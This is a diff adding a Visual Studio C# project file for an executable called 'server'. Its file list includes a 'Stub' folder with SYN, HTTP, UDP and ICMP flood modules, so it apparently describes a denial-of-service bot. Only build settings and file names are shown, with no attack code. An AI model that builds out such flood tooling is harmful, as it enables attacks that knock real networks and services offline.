@@ -1,0 +1,30 @@
+<VisualStudioProject>
+  <CSHARP ProjectType="local" ProjectVersion="7.10.3077" SchemaVersion="2.0" ProjectGuid="1a8d77c9-2c52-4a2a-a9d0-869227952aac">
+    <Build>
+      <Settings AssemblyName="server" DefaultClientScript="JScript" DefaultHTMLPageLayout="Grid" DefaultTargetSchema="IE50" DelaySign="false" OutputType="WinExe">
+        <Config Name="Debug" AllowUnsafeBlocks="true" DefineConstants="DEBUG;TRACE" DebugSymbols="true" IncrementalBuild="false" NoStdLib="false" Optimize="false" OutputPath="bin\Debug\" WarningLevel="4" />
+        <Config Name="Release" AllowUnsafeBlocks="true" DefineConstants="TRACE" DebugSymbols="false" IncrementalBuild="false" NoStdLib="false" Optimize="true" OutputPath="bin\Release\" WarningLevel="4" />
+      </Settings>
+      <References>
+        <Reference Name="System" AssemblyName="System" />
+        <Reference Name="System.Data" AssemblyName="System.Data" />
+        <Reference Name="System.Management" AssemblyName="System.Management" />
+        <Reference Name="System.Windows.Forms" AssemblyName="System.Windows.Forms" />
+        <Reference Name="System.Xml" AssemblyName="System.Xml" />
+      </References>
+    </Build>
+    <Files>
+      <Include>
+        <File RelPath="AssemblyInfo.cs" SubType="Code" BuildAction="Compile" />
+        <File RelPath="Global.cs" SubType="Code" BuildAction="Compile" />
+        <File RelPath="Stub\Stub.cs" SubType="Code" BuildAction="Compile" />
+        <File RelPath="Stub\SynFlood.cs" SubType="Code" BuildAction="Compile" />
+        <File RelPath="Stub\HttpFlood.cs" SubType="Code" BuildAction="Compile" />
+        <File RelPath="Stub\UdpFlood.cs" SubType="Code" BuildAction="Compile" />
+        <File RelPath="Stub\IcmpFlood.cs" SubType="Code" BuildAction="Compile" />
+        <File RelPath="Stub\RandomStringGenerator.cs" SubType="Code" BuildAction="Compile" />
+        <File RelPath="Stub\SQLiteBase.cs" SubType="Code" BuildAction="Compile" />
+      </Include>
+    </Files>
+  </CSHARP>
+</VisualStudioProject>
